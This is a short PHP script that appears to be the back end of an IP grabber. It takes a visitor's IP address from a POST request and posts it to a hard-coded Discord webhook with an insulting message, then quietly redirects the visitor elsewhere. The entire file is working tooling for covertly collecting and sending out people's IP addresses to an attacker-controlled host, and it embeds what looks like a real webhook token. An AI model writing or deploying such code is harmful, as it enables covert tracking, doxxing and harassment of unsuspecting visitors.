<?php
// Get the IP address from the POST request
$ip = $_POST['ip'];

// Discord webhook URL
$webhook_url = "https://discord.com/api/webhooks/1274893705744093275/CNaSYOLnoBDBp740FvHCLTNd1231NQcsqWFnp-R5PhzTiSZpzwHF39vKKDRmJUy5P6Hy";

// Prepare the message to send to the Discord webhook
$message = array(
    "content" => "`stupid fucks ip is " . $ip . "`"
);

// Send the message to the Discord webhook
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($message));
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Redirect the user back to the website
header("Location: https://example.com");
exit;
?>